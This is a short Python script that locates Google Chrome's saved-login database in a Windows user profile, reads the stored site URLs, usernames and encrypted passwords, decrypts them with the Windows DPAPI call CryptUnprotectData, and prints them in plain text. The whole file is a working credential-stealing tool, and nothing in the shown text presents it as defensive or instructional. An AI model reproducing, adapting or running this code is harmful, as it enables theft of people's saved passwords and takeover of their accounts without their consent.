import sys, os
import sqlite3
import win32crypt


def findFile():
    path = ""
    for w in os.walk(os.getenv('USERPROFILE')):
        if 'Chrome' in w[1]:
            path = str(w[0]) + "\\Chrome\\User Data\\Default\\Login Data"
    return path

def  DCFile(path):
    connect = sqlite3.connect(path)
    cursor = connect.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    data = cursor.fetchall()
    if len(data) > 0:
        for result in data:
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
            if password:
                print('[+] URL %s | Username: %s | Password: %s'%(result[0], result[1], password))
    else:
        print('[-] No result returned from query')
